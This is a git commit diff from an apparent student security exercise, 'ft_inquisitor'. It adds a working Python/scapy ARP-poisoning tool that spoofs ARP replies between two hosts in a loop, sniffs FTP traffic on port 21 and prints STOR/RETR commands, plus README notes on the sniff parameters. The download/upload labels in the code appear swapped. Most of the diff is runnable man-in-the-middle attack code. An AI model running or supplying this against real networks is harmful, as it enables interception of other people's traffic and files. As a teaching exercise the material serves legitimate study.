010a09a5ba14d6528c2806b5c2239ccffbc57efa
Alessio Scatamacchia <ascatama@student.42lyon.fr>
2024-06-11 11:52:42 +0200

    connect client filezilla

--- ft_inquisitor/README.md
+++ ft_inquisitor/README.md
@@ -25,3 +25,31 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac):
 ```
 
 ff:ff:ff:ff:ff:ff --> adress brodcast
+
+## sniff 
+
+- capture network packet
+- filtering
+- storing
+
+### parameters
+
+filter: A BPF (Berkeley Packet Filter) string to filter packets. In this case, "tcp port 21" filters for packets on TCP port 21, which is the default port for FTP traffic.
+prn: A callback function that is called for each captured packet. In this case, packet_callback is the function that processes each packet.
+store: If set to 0, packets are not stored in memory. This is useful for saving memory when you only want to process packets.
+count: The number of packets to capture. Here, it captures 10 packets before stopping.
+
+## packet_callback
+
+``` 
+if packet.haslayer(TCP) and packet.haslayer(Raw):
+```
+
+- haslayer() = check if a packet contains a specific protocol layer
+
+check if the packet contains both TCP and Raw layers
+
+### why we must to verify that in packet, there is TCP and Raw ?
+
+- Ensuring TCP: Without the TCP check, we might attempt to process packets that are not part of a TCP connection, leading to incorrect assumptions about the packet structure and potential errors in handling.
+- Ensuring Raw: Without the Raw check, we might miss packets that do not contain application-layer data, leading to incomplete monitoring of FTP commands.
--- ft_inquisitor/inquisitor.py
+++ ft_inquisitor/inquisitor.py
@@ -1,6 +1,10 @@
 import sys
 import argparse
 import re
+from scapy.all import *
+from scapy.layers.inet import IP, TCP
+from scapy.layers.l2 import ARP, Ether
+import signal
 
 def is_valid_mac(mac_str):
     mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
@@ -22,6 +26,28 @@ def is_valid_ip(ip_str):
         print(f"IP address contains non-numeric values: {ip_str}. Expected numeric values in each octet.")
         sys.exit(1)
 
+# full duplex
+def arp_poison(target_ip, target_mac, source_ip, source_mac):
+    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac), verbose=False)
+    send(ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=target_ip, hwsrc=target_mac), verbose=False)
+
+# restore with adress broadcast
+def restore_arp(target_ip, target_mac, source_ip, source_mac):
+    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=source_mac, psrc=source_ip), count=3, verbose=False)
+    send(ARP(op=2, pdst=source_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, psrc=target_ip), count=3, verbose=False)
+
+def stop_attack(signum, frame):
+    print("\nStopping ARP poisoning and restoring network...")
+    restore_arp(args.ip_target, args.mac_target, args.ip_src, args.mac_src)
+    sys.exit(0)
+
+def packet_callback(packet):
+    if packet.haslayer(TCP) and packet.haslayer(Raw):
+        payload = packet[Raw].load
+        if b"STOR" in payload:
+            print(f"Downloading: FTP file transfer detected: {payload}")
+        if b"RETR" in payload:
+            print(f"Uploading: FTP file transfer detected: {payload}")
 
 if __name__ == "__main__":
 
@@ -35,5 +61,20 @@ if __name__ == "__main__":
     parser.add_argument("ip_target", type=is_valid_ip, help="IP-target")
     parser.add_argument("mac_target", type=is_valid_mac, help="MAC-target")
     args = parser.parse_args()
+
+    signal.signal(signal.SIGINT, stop_attack)
+
+    print("Starting ARP poisoning... Press CTRL+C to stop.")
+    
+    try:
+        while True: # to update cache 
+            arp_poison(args.ip_target, args.mac_target, args.ip_src, args.mac_src)
+            arp_poison(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
+            sniff(filter="tcp port 21", prn=packet_callback, store=0, count=10)
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error: {e}")
+        restore_arp(args.ip_target, args.mac_target, args.ip_src, args.mac_src)
+        sys.exit(1)
 
     print(args)
